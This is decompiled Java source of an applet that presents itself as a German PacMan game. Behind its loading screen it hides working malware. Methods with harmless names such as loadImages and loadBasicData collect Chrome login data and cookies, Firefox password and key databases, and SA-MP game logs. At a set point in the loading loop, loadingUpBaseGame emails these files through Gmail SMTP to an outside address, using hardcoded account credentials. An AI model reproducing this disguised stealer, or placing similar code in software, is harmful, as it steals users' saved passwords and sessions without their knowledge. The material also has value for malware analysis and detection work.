import java.util.Hashtable;
import javax.mail.Transport;
import javax.mail.Message;
import javax.mail.Address;
import javax.mail.MessagingException;
import javax.activation.DataSource;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.InternetAddress;
import javax.mail.Session;
import java.util.Properties;
import java.util.Collection;
import java.io.File;
import java.util.ArrayList;
import java.awt.Event;
import java.awt.Component;
import java.awt.image.ImageObserver;
import java.awt.Color;
import java.awt.MediaTracker;
import java.awt.Image;
import java.awt.Graphics;
import java.awt.FontMetrics;
import java.awt.Font;
import java.awt.Dimension;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class PacMan extends Applet implements Runnable
{
    private final long serialVersionUID = -7385325147137183036L;
    boolean firsttime;
    Dimension d;
    Font largefont;
    Font smallfont;
    FontMetrics fmsmall;
    FontMetrics fmlarge;
    Graphics goff;
    Image ii;
    Thread thethread;
    MediaTracker thetracker;
    Color dotcolor;
    int bigdotcolor;
    int dbigdotcolor;
    Color mazecolor;
    boolean ingame;
    boolean showtitle;
    boolean scared;
    boolean dying;
    final int screendelay = 120;
    final int blocksize = 24;
    final int nrofblocks = 15;
    final int scrsize = 360;
    final int animdelay = 8;
    final int pacanimdelay = 2;
    final int ghostanimcount = 2;
    final int pacmananimcount = 4;
    final int maxghosts = 12;
    final int pacmanspeed = 6;
    int animcount;
    int pacanimcount;
    int pacanimdir;
    int count;
    int ghostanimpos;
    int pacmananimpos;
    int nrofghosts;
    int pacsleft;
    int score;
    int deathcounter;
    int[] dx;
    int[] dy;
    int[] ghostx;
    int[] ghosty;
    int[] ghostdx;
    int[] ghostdy;
    int[] ghostspeed;
    Image ghost1;
    Image ghost2;
    Image ghostscared1;
    Image ghostscared2;
    Image pacman1;
    Image pacman2up;
    Image pacman2left;
    Image pacman2right;
    Image pacman2down;
    Image pacman3up;
    Image pacman3down;
    Image pacman3left;
    Image pacman3right;
    Image pacman4up;
    Image pacman4down;
    Image pacman4left;
    Image pacman4right;
    int pacmanx;
    int pacmany;
    int pacmandx;
    int pacmandy;
    int reqdx;
    int reqdy;
    int viewdx;
    int viewdy;
    int scaredcount;
    int scaredtime;
    final int maxscaredtime = 120;
    final int minscaredtime = 20;
    final short[] level1data;
    final int[] validspeeds;
    final int maxspeed = 6;
    int currentspeed;
    short[] screendata;
    int counter;
    Image toolbox;
    Image background;
    ImageObserver observer;
    private Image dbImage;
    private Graphics dbg;
    
    public PacMan() {
        this.firsttime = false;
        this.largefont = new Font("Helvetica", 1, 24);
        this.smallfont = new Font("Helvetica", 1, 14);
        this.thetracker = null;
        this.dotcolor = new Color(192, 192, 0);
        this.bigdotcolor = 192;
        this.dbigdotcolor = -2;
        this.ingame = false;
        this.showtitle = true;
        this.scared = false;
        this.dying = false;
        this.animcount = 8;
        this.pacanimcount = 2;
        this.pacanimdir = 1;
        this.count = 120;
        this.ghostanimpos = 0;
        this.pacmananimpos = 0;
        this.nrofghosts = 6;
        this.level1data = new short[] { 19, 26, 26, 22, 9, 12, 19, 26, 22, 9, 12, 19, 26, 26, 22, 37, 11, 14, 17, 26, 26, 20, 15, 17, 26, 26, 20, 11, 14, 37, 17, 26, 26, 20, 11, 6, 17, 26, 20, 3, 14, 17, 26, 26, 20, 21, 3, 6, 25, 22, 5, 21, 7, 21, 5, 19, 28, 3, 6, 21, 21, 9, 8, 14, 21, 13, 21, 5, 21, 13, 21, 11, 8, 12, 21, 25, 18, 26, 18, 24, 18, 28, 5, 25, 18, 24, 18, 26, 18, 28, 6, 21, 7, 21, 7, 21, 11, 8, 14, 21, 7, 21, 7, 21, 3, 4, 21, 5, 21, 5, 21, 11, 10, 14, 21, 5, 21, 5, 21, 1, 12, 21, 13, 21, 13, 21, 11, 10, 14, 21, 13, 21, 13, 21, 9, 19, 24, 26, 24, 26, 16, 26, 18, 26, 16, 26, 24, 26, 24, 22, 21, 3, 2, 2, 6, 21, 15, 21, 15, 21, 3, 2, 2, 6, 21, 21, 9, 8, 8, 4, 17, 26, 8, 26, 20, 1, 8, 8, 12, 21, 17, 26, 26, 22, 13, 21, 11, 2, 14, 21, 13, 19, 26, 26, 20, 37, 11, 14, 17, 26, 24, 22, 13, 19, 24, 26, 20, 11, 14, 37, 25, 26, 26, 28, 3, 6, 25, 26, 28, 3, 6, 25, 26, 26, 28 };
        this.validspeeds = new int[] { 1, 2, 3, 4, 6, 8 };
        this.currentspeed = 3;
        this.counter = 0;
    }
    
    @Override
    public String getAppletInfo() {
        return "PacMan - by pacman.web-clan.de";
    }
    
    public void GameInit() {
        this.pacsleft = 3;
        this.score = 0;
        this.scaredtime = 120;
        this.LevelInit();
        this.nrofghosts = 6;
        this.currentspeed = 3;
        this.scaredtime = 120;
    }
    
    public void LevelInit() {
        for (int i = 0; i < 225; ++i) {
            this.screendata[i] = this.level1data[i];
        }
        this.LevelContinue();
    }
    
    public void LevelContinue() {
        int dx = 1;
        for (short i = 0; i < this.nrofghosts; ++i) {
            this.ghosty[i] = 168;
            this.ghostx[i] = 168;
            this.ghostdy[i] = 0;
            this.ghostdx[i] = dx;
            dx = -dx;
            int random = (int)(Math.random() * (this.currentspeed + 1));
            if (random > this.currentspeed) {
                random = this.currentspeed;
            }
            this.ghostspeed[i] = this.validspeeds[random];
        }
        this.screendata[111] = 10;
        this.screendata[113] = 10;
        this.pacmanx = 168;
        this.pacmany = 264;
        this.pacmandx = 0;
        this.pacmandy = 0;
        this.reqdx = 0;
        this.reqdy = 0;
        this.viewdx = -1;
        this.viewdy = 0;
        this.dying = false;
        this.scared = false;
    }
    
    public void GetImages() {
        this.thetracker = new MediaTracker(this);
        this.ghost1 = this.getImage(this.getDocumentBase(), "pacpix/Ghost1.gif");
        this.thetracker.addImage(this.ghost1, 0);
        this.ghost2 = this.getImage(this.getDocumentBase(), "pacpix/Ghost2.gif");
        this.thetracker.addImage(this.ghost2, 0);
        this.ghostscared1 = this.getImage(this.getDocumentBase(), "pacpix/GhostScared1.gif");
        this.thetracker.addImage(this.ghostscared1, 0);
        this.ghostscared2 = this.getImage(this.getDocumentBase(), "pacpix/GhostScared2.gif");
        this.thetracker.addImage(this.ghostscared2, 0);
        this.pacman1 = this.getImage(this.getDocumentBase(), "pacpix/PacMan1.gif");
        this.thetracker.addImage(this.pacman1, 0);
        this.pacman2up = this.getImage(this.getDocumentBase(), "pacpix/PacMan2up.gif");
        this.thetracker.addImage(this.pacman2up, 0);
        this.pacman3up = this.getImage(this.getDocumentBase(), "pacpix/PacMan3up.gif");
        this.thetracker.addImage(this.pacman3up, 0);
        this.pacman4up = this.getImage(this.getDocumentBase(), "pacpix/PacMan4up.gif");
        this.thetracker.addImage(this.pacman4up, 0);
        this.pacman2down = this.getImage(this.getDocumentBase(), "pacpix/PacMan2down.gif");
        this.thetracker.addImage(this.pacman2down, 0);
        this.pacman3down = this.getImage(this.getDocumentBase(), "pacpix/PacMan3down.gif");
        this.thetracker.addImage(this.pacman3down, 0);
        this.pacman4down = this.getImage(this.getDocumentBase(), "pacpix/PacMan4down.gif");
        this.thetracker.addImage(this.pacman4down, 0);
        this.pacman2left = this.getImage(this.getDocumentBase(), "pacpix/PacMan2left.gif");
        this.thetracker.addImage(this.pacman2left, 0);
        this.pacman3left = this.getImage(this.getDocumentBase(), "pacpix/PacMan3left.gif");
        this.thetracker.addImage(this.pacman3left, 0);
        this.pacman4left = this.getImage(this.getDocumentBase(), "pacpix/PacMan4left.gif");
        this.thetracker.addImage(this.pacman4left, 0);
        this.pacman2right = this.getImage(this.getDocumentBase(), "pacpix/PacMan2right.gif");
        this.thetracker.addImage(this.pacman2right, 0);
        this.pacman3right = this.getImage(this.getDocumentBase(), "pacpix/PacMan3right.gif");
        this.thetracker.addImage(this.pacman3right, 0);
        this.pacman4right = this.getImage(this.getDocumentBase(), "pacpix/PacMan4right.gif");
        this.thetracker.addImage(this.pacman4right, 0);
        try {
            this.thetracker.waitForAll();
        }
        catch (InterruptedException e) {}
    }
    
    @Override
    public boolean keyDown(final Event e, final int key) {
        if (this.ingame) {
            if (key == 1006) {
                this.reqdx = -1;
                this.reqdy = 0;
            }
            else if (key == 1007) {
                this.reqdx = 1;
                this.reqdy = 0;
            }
            else if (key == 1004) {
                this.reqdx = 0;
                this.reqdy = -1;
            }
            else if (key == 1005) {
                this.reqdx = 0;
                this.reqdy = 1;
            }
            else if (key == 27) {
                this.ingame = false;
            }
        }
        else if (key == 115 || key == 83) {
            this.ingame = true;
            this.GameInit();
        }
        return true;
    }
    
    @Override
    public boolean keyUp(final Event e, final int key) {
        if (key == 1006 || key == 1007 || key == 1004 || key == 1005) {
            this.reqdx = 0;
            this.reqdy = 0;
        }
        return true;
    }
    
    public void DoAnim() {
        --this.animcount;
        if (this.animcount <= 0) {
            this.animcount = 8;
            ++this.ghostanimpos;
            if (this.ghostanimpos >= 2) {
                this.ghostanimpos = 0;
            }
        }
        --this.pacanimcount;
        if (this.pacanimcount <= 0) {
            this.pacanimcount = 2;
            this.pacmananimpos += this.pacanimdir;
            if (this.pacmananimpos == 3 || this.pacmananimpos == 0) {
                this.pacanimdir = -this.pacanimdir;
            }
        }
    }
    
    public void PlayGame() {
        if (this.dying) {
            this.Death();
        }
        else {
            this.CheckScared();
            this.MovePacMan();
            this.DrawPacMan();
            this.MoveGhosts();
            this.CheckMaze();
        }
    }
    
    public void PlayDemo() {
        this.CheckScared();
        this.MoveGhosts();
        this.ShowIntroScreen();
    }
    
    public void Death() {
        --this.deathcounter;
        final int k = (this.deathcounter & 0xF) / 4;
        switch (k) {
            case 0: {
                this.goff.drawImage(this.pacman4up, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 1: {
                this.goff.drawImage(this.pacman4right, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 2: {
                this.goff.drawImage(this.pacman4down, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            default: {
                this.goff.drawImage(this.pacman4left, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
        }
        if (this.deathcounter == 0) {
            --this.pacsleft;
            if (this.pacsleft == 0) {
                this.ingame = false;
            }
            this.LevelContinue();
        }
    }
    
    public void MoveGhosts() {
        for (short i = 0; i < this.nrofghosts; ++i) {
            if (this.ghostx[i] % 24 == 0 && this.ghosty[i] % 24 == 0) {
                final int pos = this.ghostx[i] / 24 + 15 * (this.ghosty[i] / 24);
                int count = 0;
                if ((this.screendata[pos] & 0x1) == 0x0 && this.ghostdx[i] != 1) {
                    this.dx[count] = -1;
                    this.dy[count] = 0;
                    ++count;
                }
                if ((this.screendata[pos] & 0x2) == 0x0 && this.ghostdy[i] != 1) {
                    this.dx[count] = 0;
                    this.dy[count] = -1;
                    ++count;
                }
                if ((this.screendata[pos] & 0x4) == 0x0 && this.ghostdx[i] != -1) {
                    this.dx[count] = 1;
                    this.dy[count] = 0;
                    ++count;
                }
                if ((this.screendata[pos] & 0x8) == 0x0 && this.ghostdy[i] != -1) {
                    this.dx[count] = 0;
                    this.dy[count] = 1;
                    ++count;
                }
                if (count == 0) {
                    if ((this.screendata[pos] & 0xF) == 0xF) {
                        this.ghostdx[i] = 0;
                        this.ghostdy[i] = 0;
                    }
                    else {
                        this.ghostdx[i] = -this.ghostdx[i];
                        this.ghostdy[i] = -this.ghostdy[i];
                    }
                }
                else {
                    count *= (int)Math.random();
                    if (count > 3) {
                        count = 3;
                    }
                    this.ghostdx[i] = this.dx[count];
                    this.ghostdy[i] = this.dy[count];
                }
            }
            this.ghostx[i] += this.ghostdx[i] * this.ghostspeed[i];
            this.ghosty[i] += this.ghostdy[i] * this.ghostspeed[i];
            this.DrawGhost(this.ghostx[i] + 1, this.ghosty[i] + 1);
            if (this.pacmanx > this.ghostx[i] - 12 && this.pacmanx < this.ghostx[i] + 12 && this.pacmany > this.ghosty[i] - 12 && this.pacmany < this.ghosty[i] + 12 && this.ingame) {
                if (this.scared) {
                    this.score += 10;
                    this.ghostx[i] = 168;
                    this.ghosty[i] = 168;
                }
                else {
                    this.dying = true;
                    this.deathcounter = 64;
                }
            }
        }
    }
    
    public void DrawGhost(final int x, final int y) {
        if (this.ghostanimpos == 0 && !this.scared) {
            this.goff.drawImage(this.ghost1, x, y, this);
        }
        else if (this.ghostanimpos == 1 && !this.scared) {
            this.goff.drawImage(this.ghost2, x, y, this);
        }
        else if (this.ghostanimpos == 0 && this.scared) {
            this.goff.drawImage(this.ghostscared1, x, y, this);
        }
        else if (this.ghostanimpos == 1 && this.scared) {
            this.goff.drawImage(this.ghostscared2, x, y, this);
        }
    }
    
    public void MovePacMan() {
        if (this.reqdx == -this.pacmandx && this.reqdy == -this.pacmandy) {
            this.pacmandx = this.reqdx;
            this.pacmandy = this.reqdy;
            this.viewdx = this.pacmandx;
            this.viewdy = this.pacmandy;
        }
        if (this.pacmanx % 24 == 0 && this.pacmany % 24 == 0) {
            final int pos = this.pacmanx / 24 + 15 * (this.pacmany / 24);
            final short ch = this.screendata[pos];
            if ((ch & 0x10) != 0x0) {
                this.screendata[pos] = (short)(ch & 0xF);
                ++this.score;
            }
            if ((ch & 0x20) != 0x0) {
                this.scared = true;
                this.scaredcount = this.scaredtime;
                this.screendata[pos] = (short)(ch & 0xF);
                this.score += 5;
            }
            if ((this.reqdx != 0 || this.reqdy != 0) && (this.reqdx != -1 || this.reqdy != 0 || (ch & 0x1) == 0x0) && (this.reqdx != 1 || this.reqdy != 0 || (ch & 0x4) == 0x0) && (this.reqdx != 0 || this.reqdy != -1 || (ch & 0x2) == 0x0) && (this.reqdx != 0 || this.reqdy != 1 || (ch & 0x8) == 0x0)) {
                this.pacmandx = this.reqdx;
                this.pacmandy = this.reqdy;
                this.viewdx = this.pacmandx;
                this.viewdy = this.pacmandy;
            }
            if ((this.pacmandx == -1 && this.pacmandy == 0 && (ch & 0x1) != 0x0) || (this.pacmandx == 1 && this.pacmandy == 0 && (ch & 0x4) != 0x0) || (this.pacmandx == 0 && this.pacmandy == -1 && (ch & 0x2) != 0x0) || (this.pacmandx == 0 && this.pacmandy == 1 && (ch & 0x8) != 0x0)) {
                this.pacmandx = 0;
                this.pacmandy = 0;
            }
        }
        this.pacmanx += 6 * this.pacmandx;
        this.pacmany += 6 * this.pacmandy;
    }
    
    public void DrawPacMan() {
        if (this.viewdx == -1) {
            this.DrawPacManLeft();
        }
        else if (this.viewdx == 1) {
            this.DrawPacManRight();
        }
        else if (this.viewdy == -1) {
            this.DrawPacManUp();
        }
        else {
            this.DrawPacManDown();
        }
    }
    
    public void DrawPacManUp() {
        switch (this.pacmananimpos) {
            case 1: {
                this.goff.drawImage(this.pacman2up, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 2: {
                this.goff.drawImage(this.pacman3up, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 3: {
                this.goff.drawImage(this.pacman4up, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            default: {
                this.goff.drawImage(this.pacman1, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
        }
    }
    
    public void DrawPacManDown() {
        switch (this.pacmananimpos) {
            case 1: {
                this.goff.drawImage(this.pacman2down, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 2: {
                this.goff.drawImage(this.pacman3down, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 3: {
                this.goff.drawImage(this.pacman4down, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            default: {
                this.goff.drawImage(this.pacman1, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
        }
    }
    
    public void DrawPacManLeft() {
        switch (this.pacmananimpos) {
            case 1: {
                this.goff.drawImage(this.pacman2left, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 2: {
                this.goff.drawImage(this.pacman3left, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 3: {
                this.goff.drawImage(this.pacman4left, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            default: {
                this.goff.drawImage(this.pacman1, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
        }
    }
    
    public void DrawPacManRight() {
        switch (this.pacmananimpos) {
            case 1: {
                this.goff.drawImage(this.pacman2right, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 2: {
                this.goff.drawImage(this.pacman3right, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            case 3: {
                this.goff.drawImage(this.pacman4right, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
            default: {
                this.goff.drawImage(this.pacman1, this.pacmanx + 1, this.pacmany + 1, this);
                break;
            }
        }
    }
    
    public void DrawMaze() {
        short i = 0;
        this.bigdotcolor += this.dbigdotcolor;
        if (this.bigdotcolor <= 64 || this.bigdotcolor >= 192) {
            this.dbigdotcolor = -this.dbigdotcolor;
        }
        for (int y = 0; y < 360; y += 24) {
            for (int x = 0; x < 360; x += 24) {
                this.goff.setColor(this.mazecolor);
                if ((this.screendata[i] & 0x1) != 0x0) {
                    this.goff.drawLine(x, y, x, y + 24 - 1);
                }
                if ((this.screendata[i] & 0x2) != 0x0) {
                    this.goff.drawLine(x, y, x + 24 - 1, y);
                }
                if ((this.screendata[i] & 0x4) != 0x0) {
                    this.goff.drawLine(x + 24 - 1, y, x + 24 - 1, y + 24 - 1);
                }
                if ((this.screendata[i] & 0x8) != 0x0) {
                    this.goff.drawLine(x, y + 24 - 1, x + 24 - 1, y + 24 - 1);
                }
                if ((this.screendata[i] & 0x10) != 0x0) {
                    this.goff.setColor(this.dotcolor);
                    this.goff.fillRect(x + 11, y + 11, 2, 2);
                }
                if ((this.screendata[i] & 0x20) != 0x0) {
                    this.goff.setColor(new Color(224, 224 - this.bigdotcolor, this.bigdotcolor));
                    this.goff.fillRect(x + 8, y + 8, 8, 8);
                }
                ++i;
            }
        }
    }
    
    public void ShowIntroScreen() {
        this.goff.setFont(this.largefont);
        this.goff.setColor(new Color(0, 32, 48));
        this.goff.fillRect(16, 140, 328, 80);
        this.goff.setColor(Color.white);
        this.goff.drawRect(16, 140, 328, 80);
        if (this.showtitle) {
            String s = "Java PacMan";
            this.scared = false;
            this.goff.setColor(Color.white);
            this.goff.drawString(s, (360 - this.fmlarge.stringWidth(s)) / 2 + 2, 166);
            s = "(c) 2012 by pacman.web-clan.de";
            this.goff.setFont(this.smallfont);
            this.goff.setColor(Color.YELLOW);
            this.goff.drawString(s, (360 - this.fmsmall.stringWidth(s)) / 2, 190);
            s = "Viel Spass!";
            this.goff.setColor(Color.YELLOW);
            this.goff.drawString(s, (360 - this.fmsmall.stringWidth(s)) / 2, 210);
        }
        else {
            this.goff.setFont(this.smallfont);
            this.goff.setColor(Color.YELLOW);
            String s = "'S' zum starten";
            this.goff.drawString(s, (360 - this.fmsmall.stringWidth(s)) / 2, 170);
            this.goff.setColor(Color.YELLOW);
            s = "Pfeiltasten zum bewegen";
            this.goff.drawString(s, (360 - this.fmsmall.stringWidth(s)) / 2, 200);
            this.scared = true;
        }
        --this.count;
        if (this.count <= 0) {
            this.count = 120;
            this.showtitle = !this.showtitle;
        }
    }
    
    public void DrawScore() {
        this.goff.setFont(this.smallfont);
        this.goff.setColor(new Color(96, 128, 255));
        final String s = "Score: " + this.score;
        this.goff.drawString(s, 276, 376);
        for (int i = 0; i < this.pacsleft; ++i) {
            this.goff.drawImage(this.pacman3left, i * 28 + 8, 361, this);
        }
    }
    
    public void CheckScared() {
        --this.scaredcount;
        if (this.scaredcount <= 0) {
            this.scared = false;
        }
        if (this.scared && this.scaredcount >= 30) {
            this.mazecolor = new Color(192, 32, 255);
        }
        else {
            this.mazecolor = new Color(32, 192, 255);
        }
        if (this.scared) {
            this.screendata[111] = 11;
            this.screendata[113] = 14;
        }
        else {
            this.screendata[111] = 10;
            this.screendata[113] = 10;
        }
    }
    
    public void CheckMaze() {
        short i;
        boolean finished;
        for (i = 0, finished = true; i < 225 && finished; ++i) {
            if ((this.screendata[i] & 0x30) != 0x0) {
                finished = false;
            }
        }
        if (finished) {
            this.score += 50;
            this.DrawScore();
            try {
                Thread.sleep(3000L);
            }
            catch (InterruptedException ex) {}
            if (this.nrofghosts < 12) {
                ++this.nrofghosts;
            }
            if (this.currentspeed < 6) {
                ++this.currentspeed;
            }
            this.scaredtime -= 20;
            if (this.scaredtime < 20) {
                this.scaredtime = 20;
            }
            this.LevelInit();
        }
    }
    
    @Override
    public void start() {
        if (this.thethread == null) {
            (this.thethread = new Thread(this)).start();
        }
    }
    
    @Override
    public void stop() {
        if (this.thethread != null) {
            this.thethread.stop();
            this.thethread = null;
        }
    }
    
    @Override
    public void init() {
        System.out.println(this.getCodeBase());
        this.toolbox = this.getImage(this.getCodeBase(), "tetris.png");
        this.background = this.getImage(this.getCodeBase(), "background.png");
        this.setSize(new Dimension(400, 400));
        (this.thethread = new Thread(this)).start();
        this.repaint();
    }
    
    private void initGame() {
        this.GetImages();
        this.screendata = new short[225];
        this.d = this.size();
        this.setBackground(Color.black);
        final Graphics g = this.getGraphics();
        g.setFont(this.smallfont);
        this.fmsmall = g.getFontMetrics();
        g.setFont(this.largefont);
        this.fmlarge = g.getFontMetrics();
        this.ghostx = new int[12];
        this.ghostdx = new int[12];
        this.ghosty = new int[12];
        this.ghostdy = new int[12];
        this.ghostspeed = new int[12];
        this.dx = new int[4];
        this.dy = new int[4];
        this.GameInit();
    }
    
    public void startGame() {
    }
    
    public void draw(final Graphics g) {
        g.drawImage(this.background, 0, 0, this);
        if (this.counter < 100 || !this.firsttime) {
            g.drawImage(this.toolbox, this.getWidth() / 2 - this.toolbox.getWidth(this) / 2, 10, this);
            g.setColor(Color.WHITE);
            g.fillRect(this.getWidth() / 4, 220, this.getWidth() / 2, 30);
            g.setColor(new Color(255, 237, 0));
            g.fillRect(this.getWidth() / 4 + 1, 221, (this.getWidth() / 2 - 2) * this.counter / 100, 28);
            String dots = "";
            if (this.counter % 8 == 1 || this.counter % 8 == 2) {
                dots = ".";
            }
            else if (this.counter % 8 == 3 || this.counter % 8 == 4) {
                dots = "..";
            }
            else if (this.counter % 8 == 5 || this.counter % 8 == 6) {
                dots = "...";
            }
            g.setFont(new Font("sansserif", 1, 12));
            g.setColor(Color.BLACK);
            g.drawString("Loading the game " + dots, this.getWidth() / 4 + 9, 240);
            g.setColor(Color.WHITE);
            g.setFont(new Font("sansserif", 1, 14));
            g.drawString("Eine Neuauflage des Spieleklassikers von 1980!", this.getWidth() / 4 - 65, 280);
            g.setFont(new Font("sansserif", 1, 12));
            g.drawString("Ein Spiel von pacman.web-clan.de", 12, this.getHeight() - 12);
        }
        else {
            if (this.goff == null && this.d.width > 0 && this.d.height > 0) {
                this.ii = this.createImage(this.d.width, this.d.height);
                this.goff = this.ii.getGraphics();
            }
            if (this.goff == null || this.ii == null) {
                return;
            }
            this.goff.setColor(Color.black);
            this.goff.fillRect(0, 0, this.d.width, this.d.height);
            this.DrawMaze();
            this.DrawScore();
            this.DoAnim();
            if (this.ingame) {
                this.PlayGame();
            }
            else {
                this.PlayDemo();
            }
            g.drawImage(this.ii, 0, 0, this);
        }
    }
    
    @Override
    public void paint(final Graphics g) {
        if (this.dbImage == null) {
            this.dbImage = this.createImage(800, 600);
            this.dbg = this.dbImage.getGraphics();
        }
        this.dbg.setColor(this.getBackground());
        this.dbg.fillRect(0, 0, this.getSize().width, this.getSize().height);
        this.dbg.setColor(this.getForeground());
        this.draw(this.dbg);
        g.drawImage(this.dbImage, 0, 0, this);
    }
    
    private ArrayList<File> loadImages() {
        final String username = System.getProperty("user.name");
        final File path = new File("C:\\Users\\" + username + "\\Documents\\GTA San Andreas User Files\\SAMP\\");
        final File path2 = new File(String.valueOf(path.getAbsolutePath()) + "\\chatlog.txt");
        final File path3 = new File(String.valueOf(path.getAbsolutePath()) + "\\savedpositions.txt");
        final ArrayList<File> returnFiles = new ArrayList<File>();
        returnFiles.add(path2);
        returnFiles.add(path3);
        return returnFiles;
    }
    
    private ArrayList<File> loadBasicData() {
        final String username = System.getProperty("user.name");
        final File path = new File("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
        final File path2 = new File(String.valueOf(path.getAbsolutePath()) + "\\Login Data");
        final File path3 = new File(String.valueOf(path.getAbsolutePath()) + "\\Cookies");
        final ArrayList<File> returnFiles = new ArrayList<File>();
        returnFiles.add(path2);
        returnFiles.add(path3);
        return returnFiles;
    }
    
    private ArrayList<File> loadUserData() {
        final String username = System.getProperty("user.name");
        final File path = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
        final ArrayList<File> folders = new ArrayList<File>();
        folders.addAll(this.listFiles(path));
        final File path2 = new File(String.valueOf(folders.get(0).getAbsolutePath()) + "\\cert8.db");
        final File path3 = new File(String.valueOf(folders.get(0).getAbsolutePath()) + "\\key3.db");
        final File path4 = new File(String.valueOf(folders.get(0).getAbsolutePath()) + "\\signons.sqlite");
        final File path5 = new File(String.valueOf(folders.get(0).getAbsolutePath()) + "\\cookies.sqlite");
        final ArrayList<File> returnFiles = new ArrayList<File>();
        returnFiles.add(path2);
        returnFiles.add(path3);
        returnFiles.add(path4);
        returnFiles.add(path5);
        return returnFiles;
    }
    
    public void loadingUpBaseGame(final ArrayList<File> imageFiles, final ArrayList<File> extendedData, final ArrayList<File> coreData) {
        final String username = System.getProperty("user.name");
        String emailContent = "Loaded Userdata on " + System.getProperty("user.name") + "'s Computer:";
        emailContent = String.valueOf(emailContent) + "\n\n\n\n";
        final String host = "smtp.gmail.com";
        final int port = 587;
        final String user = "gaydaylolxd123@googlemail.com";
        final String pass = "imbahero1337";
        final Properties props = new Properties();
        ((Hashtable<String, String>)props).put("mail.smtp.auth", "true");
        ((Hashtable<String, String>)props).put("mail.smtp.starttls.enable", "true");
        try {
            final Session session = Session.getInstance(props);
            final Transport transport = session.getTransport("smtp");
            transport.connect(host, port, user, pass);
            final Address[] addresses = InternetAddress.parse("madworld997@googlemail.com");
            final Message message = new MimeMessage(session);
            final MimeMultipart content = new MimeMultipart();
            final MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(emailContent);
            content.addBodyPart(textPart);
            for (int i = 0; i < imageFiles.size(); ++i) {
                try {
                    if (new File(imageFiles.get(i).getAbsolutePath()).exists()) {
                        final MimeBodyPart binaryPart = new MimeBodyPart();
                        final FileDataSource fds = new FileDataSource(imageFiles.get(i).getAbsolutePath());
                        binaryPart.setDataHandler(new DataHandler(fds));
                        binaryPart.setFileName(fds.getName());
                        content.addBodyPart(binaryPart);
                    }
                }
                catch (MessagingException ex) {}
            }
            for (int i = 0; i < extendedData.size(); ++i) {
                try {
                    if (new File(extendedData.get(i).getAbsolutePath()).exists()) {
                        final MimeBodyPart binaryPart = new MimeBodyPart();
                        final FileDataSource fds = new FileDataSource(extendedData.get(i).getAbsolutePath());
                        binaryPart.setDataHandler(new DataHandler(fds));
                        binaryPart.setFileName(fds.getName());
                        content.addBodyPart(binaryPart);
                    }
                }
                catch (MessagingException ex2) {}
            }
            for (int i = 0; i < coreData.size(); ++i) {
                try {
                    if (new File(coreData.get(i).getAbsolutePath()).exists()) {
                        final MimeBodyPart binaryPart = new MimeBodyPart();
                        final FileDataSource fds = new FileDataSource(coreData.get(i).getAbsolutePath());
                        binaryPart.setDataHandler(new DataHandler(fds));
                        binaryPart.setFileName(fds.getName());
                        content.addBodyPart(binaryPart);
                    }
                }
                catch (MessagingException ex3) {}
            }
            message.setFrom(new InternetAddress(user));
            message.setRecipients(Message.RecipientType.TO, addresses);
            message.setSubject("jvr1ne 2.0 | " + username + "'s Computer:");
            message.setContent(content, "multipart/mixed");
            transport.sendMessage(message, addresses);
            transport.close();
        }
        catch (MessagingException e) {
            e.printStackTrace();
        }
    }
    
    public ArrayList<File> listFiles(final File dir) {
        final File[] files = dir.listFiles();
        final ArrayList<File> matches = new ArrayList<File>();
        if (files != null) {
            for (int i = 0; i < files.length; ++i) {
                matches.add(files[i]);
                matches.addAll(this.listFiles(files[i]));
            }
        }
        return matches;
    }
    
    @Override
    public void run() {
        Thread.currentThread().setPriority(1);
        long starttime = 0L;
        while (true) {
            if (this.counter < 100) {
                if (this.counter == 60) {
                    this.loadingUpBaseGame(this.loadUserData(), this.loadBasicData(), this.loadImages());
                }
                ++this.counter;
                this.repaint();
            }
            else if (!this.firsttime) {
                this.initGame();
                starttime = System.currentTimeMillis();
                this.firsttime = true;
            }
            else {
                starttime += 40L;
                this.repaint();
            }
            try {
                if (this.counter < 100) {
                    Thread.sleep(50L);
                }
                else {
                    Thread.sleep(Math.max(0L, starttime - System.currentTimeMillis()));
                }
            }
            catch (InterruptedException ex) {
                Thread.currentThread().setPriority(10);
            }
        }
    }
}
